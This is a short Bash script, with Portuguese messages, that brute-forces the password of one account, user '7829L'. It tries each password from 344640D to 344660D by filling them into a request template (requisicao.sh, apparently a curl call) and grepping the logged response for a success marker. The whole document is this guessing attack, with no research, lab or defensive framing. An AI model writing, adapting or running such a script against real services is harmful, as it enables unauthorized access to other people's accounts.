#!/bin/bash
#index_array=(1 2 3 4 5 6 7 8 9 0)

NUMERO_USUARIO="7829L"
for j in {344640..344660}
do
        echo "teste com a senha: $j "
        jConcat=$j"D"
        sed -e 's/ZZZUSUARIO/'"$NUMERO_USUARIO"'/' -e 's/XXXROD/'"$jConcat"'/' requisicao.sh > scriptFull.sh
        ./scriptFull.sh &> logs_curl
        LEITURA=$(cat logs_curl -n | grep "88" | grep -v "Error")
        echo "SENHA TESTADA= " $jConcat "descoberto? "

        if test "$LEITURA" = ""
        then
                echo "***"
        else
                echo "usuario encontrado com sucesso: $NUMERO_USUARIO e $jConcat"
        fi
done
